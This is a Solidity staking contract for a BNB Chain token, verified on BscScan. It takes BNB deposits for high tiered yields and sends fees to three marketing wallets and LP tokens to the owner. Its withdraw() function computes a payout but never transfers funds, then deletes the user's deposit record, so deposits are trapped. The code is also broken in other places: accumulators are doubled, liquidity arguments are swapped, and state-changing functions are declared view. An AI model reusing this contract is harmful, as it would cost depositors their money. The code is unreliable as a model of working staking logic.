/**
 *Submitted for verification at BscScan.com on 2022-06-04
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-02
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;




interface IUniswapV2Router01 {

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    
}






library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}
 interface ERC20 {
    function balanceOf(address _owner) view external  returns (uint256 balance);
    function transfer(address _to, uint256 _value) external  returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) external  returns (bool success);
    function approve(address _spender, uint256 _value) external returns (bool success);
    function allowance(address _owner, address _spender) view external  returns (uint256 remaining);
	function FreezeAcc(address account, bool target) view external returns(bool);
	function UnfreezeAcc(address account, bool target)view external returns(bool);
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}
contract StakingContract{
      using SafeMath for uint256;
      address public owner;

	  address payable public marketing1;
      address payable public marketing2;
      address payable public marketing3;
      uint256 public liquidityLimit=2e18;
      uint256 public liquidity;
      bool public Liquify;
      uint256 public liquidityAmountInTokens=100000e18;

      ERC20 public cryptoGenToken;
      
      uint256 public daily=56;
      uint256 public oneMonth=300;
      uint256 public twoMonth=670;
      uint256 public threeMonth=1000;
      uint256 public totalInvested;
      uint256 public totalWithdrawn;
      uint256 public totalUsers;
      uint256 public PERCENTS_DIVIDER=10000;
      uint256 public TIME_STEP=30;
      	struct Deposit {
		uint256 amount;
		uint256 withdrawn;
		uint256 start;
		uint256 checkpoint;

	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		uint256 refBonus;
		address refererAdd;
	}
    mapping(address=>User)public users;
    
    IUniswapV2Router01 public immutable uniswapV2Router;
    event Newbie(address user);
	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

      constructor(address Token, address payable _marketing1, address payable _marketing2, address payable _marketing3){
          cryptoGenToken=ERC20(Token);
         marketing1=_marketing1;
         marketing2=_marketing2;
         marketing3=_marketing3;
          owner =msg.sender;

                  IUniswapV2Router01 _uniswapV2Router = IUniswapV2Router01(0x10ED43C718714eb63d5aA57B78B54704E256024E);
                          uniswapV2Router = _uniswapV2Router;
      }
      modifier OnlyOwner(){
          require(msg.sender==owner,"ypu are not owner");
          _;
      }

      modifier isEnableLiquify(){
          require(Liquify);
          _;
      }


      
      function stakeCryptoGen(address refferer)public payable returns(bool){
        //   require(blrsToken.balanceOf(msg.sender)>amount,"ypu have not enough blrs tokens");

		User storage user = users[msg.sender];
		
	if (user.deposits.length == 0) {
			totalUsers = totalUsers.add(1);
			user.refererAdd=refferer;
			emit Newbie(msg.sender);
		}

		user.refBonus+=user.refBonus.add(msg.value.mul(5));
        liquidity+=liquidity.add(msg.value.mul(5).div(100));
		user.deposits.push(Deposit(msg.value, 0, block.timestamp,block.timestamp));
		totalInvested = totalInvested.add(msg.value);
        marketing1.transfer(msg.value.mul(4).div(100));
        marketing2.transfer(msg.value.mul(4).div(100));
        marketing3.transfer(msg.value.mul(2).div(100));
          cryptoGenToken.transfer(msg.sender,msg.value.mul(1000));
		//   cryptoGenToken.FreezeAcc(msg.sender,true);

          if(Liquify){
              if(liquidityLimit<liquidity){
               addLiquidity(liquidity,liquidityAmountInTokens )   ;
              }
          }
          
		emit NewDeposit(msg.sender, msg.value);
          return true;
      }
      function withdraw()public returns(bool){
          
        User storage user = users[msg.sender];
        address userAddress=msg.sender;
		// uint256 userPercentRate = getUserDividends(msg.sender);

		uint256 totalAmount;
		uint256 dividends;

// 		for (uint256 i = 0; i < user.deposits.length; i++) {

// 			if (user.deposits[i].withdrawn < (user.deposits[i].amount.mul(250)).div(PERCENTS_DIVIDER)) {

// 				if (user.deposits[i].start > user.checkpoint) {

// 					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
// 						.mul(block.timestamp.sub(user.deposits[i].start))
// 						.div(TIME_STEP);

// 				} else {

// 					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
// 						.mul(block.timestamp.sub(user.checkpoint))
// 						.div(TIME_STEP);

// 				}

// 				if (user.deposits[i].withdrawn.add(dividends) > (user.deposits[i].amount.mul(250)).div(PERCENTS_DIVIDER)) {
// 					dividends = ((user.deposits[i].amount.mul(250)).div(PERCENTS_DIVIDER)).sub(user.deposits[i].withdrawn);
// 				}

// 				user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends); /// changing of storage data
// 				totalAmount = totalAmount.add(dividends);

// 			}
// 		}
		
		
		for (uint256 i = 0; i < user.deposits.length; i++) {

// 			if (user.deposits[i].withdrawn < (user.deposits[i].amount.mul(250)).div(PERCENTS_DIVIDER)) {
            uint256 userPercentRate=getUserPercentage(userAddress,i);
				if (user.deposits[i].start > user.checkpoint) {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(getUserTimeAfterDeposit(userAddress,i));

				} else {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(getUserTimeAfterDeposit(userAddress,i));

				}

				totalAmount = totalAmount.add(dividends);

				/// no update of withdrawn because that is view function

			}
		

		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}

		user.checkpoint = block.timestamp;
        totalAmount=totalAmount.add(getUserTotalDeposits(userAddress));
		cryptoGenToken.UnfreezeAcc(msg.sender,false);

		totalWithdrawn = totalWithdrawn.add(totalAmount);

		emit Withdrawn(msg.sender, totalAmount);
		delete users[userAddress];
		return true;
      }
      
      
     function getUserTimeAfterDeposit(address userAddress, uint256 index) public view returns(uint256) {
	    User storage user = users[userAddress];

		 return(block.timestamp.sub(user.deposits[index].checkpoint));
	}
      
      
     function getUserPercentage(address userAddress,uint256 index) view public returns(uint256){
         uint256 timePassed=getUserTimeAfterDeposit(userAddress,index);
         if(timePassed<30 days ){
             return daily;
         }

         else if(timePassed<60  days){
             return oneMonth;
         }

         else if(timePassed<90 days){
             return twoMonth;
         }

         else{
             return threeMonth;
         }
         
         
     }

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

        
		uint256 totalDividends;
		uint256 dividends;

		for (uint256 i = 0; i < user.deposits.length; i++) {

// 			if (user.deposits[i].withdrawn < (user.deposits[i].amount.mul(250)).div(PERCENTS_DIVIDER)) {
            uint256 userPercentRate=getUserPercentage(userAddress,i);
				if (user.deposits[i].start > user.checkpoint) {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(getUserTimeAfterDeposit(userAddress,i));

				} else {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(getUserTimeAfterDeposit(userAddress,i));

				}

				if (user.deposits[i].withdrawn.add(dividends) > (user.deposits[i].amount.mul(2)).div(PERCENTS_DIVIDER)) {
					dividends = (user.deposits[i].amount.mul(2)).sub(user.deposits[i].withdrawn);
				}

				totalDividends = totalDividends.add(dividends);

				/// no update of withdrawn because that is view function

			}

// 		}

		return totalDividends;
	}
      	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256,uint256) {
	    User storage user = users[userAddress];

		return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start,user.deposits.length);
	}
	
	
	
		function getUserTotalDeposits(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].amount);
		}

		return amount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].withdrawn);
		}

		return amount;
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function EnableLiquidity(bool _enable)public OnlyOwner{
        Liquify=_enable;
    }

    function changeLiquidityAmountInTokenAndInBNB(uint256 InToken,uint256 InBNBs)public OnlyOwner{
        liquidityAmountInTokens=InToken;
        liquidityLimit=InBNBs;
    }



    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        cryptoGenToken.approve( address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner,
            block.timestamp
        );
    }


}